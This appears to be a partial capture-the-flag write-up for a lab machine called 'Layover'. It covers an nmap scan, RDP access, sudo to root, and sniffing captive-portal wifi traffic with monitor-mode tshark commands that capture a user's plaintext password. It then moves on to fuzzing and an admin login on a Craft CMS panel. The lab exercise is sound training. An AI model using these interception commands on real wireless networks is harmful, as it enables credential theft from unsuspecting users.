# Layover


<img width="1589" height="281" alt="image" src="https://github.com/user-attachments/assets/8b9baa28-bf7b-4170-8a35-83536905d4d8" />

---


## Nmap Scan 

```ruby
└─$ nmap -sCV -Pn 10.129.140.165
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-26 19:59 UTC
Nmap scan report for 10.129.140.165
Host is up (0.40s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
3389/tcp open  ms-wbt-server Microsoft Terminal Service
Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.29 seconds
                                                                          
```


----

> ## note in challange

<img width="1588" height="339" alt="image" src="https://github.com/user-attachments/assets/63f89b27-4878-4ee6-9a60-7c1049e02732" />



## Connect via RDP

```
rdesktop -u contractor -p 'Contractor2026!' 10.129.23.243
```

<img width="1858" height="854" alt="image" src="https://github.com/user-attachments/assets/2bf613c1-9901-46f4-984f-ecc4742cbdc5" />



```
id
sudo -l
sudo su -
```


<img width="837" height="377" alt="image" src="https://github.com/user-attachments/assets/385dd6ab-108d-41a6-9ae9-741db13be41d" />

> ## what ?!!! I get root ???
> it's fucken trap i can't find flags 


## i opend browser found :

```
http://wifi.international.htb/
```

<img width="1182" height="762" alt="image" src="https://github.com/user-attachments/assets/4e25a16d-1ee9-4920-bbf6-fcb58c25be78" />

> ## To connect to the portal you need to be connected to the airport wifi:

```
http://portal.international.htb/
```

<img width="1092" height="496" alt="image" src="https://github.com/user-attachments/assets/32f0ac53-16f8-4717-b109-5885ac0c4222" />

## now refresh page 

<img width="1179" height="818" alt="image" src="https://github.com/user-attachments/assets/b5f8bfe4-b873-4b01-9f1b-b5b6090f2ec5" />


## now network interface `wlan2` is connected to airport wifi 


```
ifconfig
```

<img width="1224" height="744" alt="image" src="https://github.com/user-attachments/assets/c7f6cbae-3e3f-4ef5-a90f-b08ecb02a145" />



## sniff traffic by make `wlan3` monitor to `wlan2`

```
ip addr show wlan2; ip route
getent hosts portal.international.htb wifi.international.htb


ip link set wlan3 down
iw dev wlan3 set type monitor
ip link set wlan3 up
iw dev wlan3 set channel 6
tshark -i wlan3 -a duration:30 -Y 'wlan.fc.type==2' -T fields -e wlan.sa -e wlan.da 2>/dev/null | sort | uniq -c | sort -rn | head

iw dev wlan3 set type monitor 2>/dev/null; ip link set wlan3 up; iw dev wlan3 set channel 6
tshark -i wlan3 -a duration:120 -Y 'http.request.method=="POST"' -T fields -e ip.src -e http.request.full_uri -e urlencoded-form.key -e urlencoded-form.value 2>/dev/null
```

<img width="1022" height="118" alt="image" src="https://github.com/user-attachments/assets/2388fdfe-1a69-4d5c-90d7-6a9011236a35" />


```
jenny : Fl1ghtDeck2026!
```

> ## i tryed it in `http://portal.international.htb/miels` but it not work so i will fuzz 

i found 

```
302  /admin
404  /login
302  /logout
404  /dashboard
404  /api
404  /api/v1
404  /robots.txt
404  /sitemap.xml
200  /index.html
404  /portal

```

## i checked `/admin` and i found login page 

<img width="1510" height="791" alt="image" src="https://github.com/user-attachments/assets/43b74870-aeb1-46b7-aa37-c8cb16fb7221" />


## i try to login and it work 

<img width="1287" height="775" alt="image" src="https://github.com/user-attachments/assets/201c53ab-146a-4c54-93af-877c8b08a4b2" />

> ### notice `Craft cms version solo 5.9.8` i searched for CVES for this version 




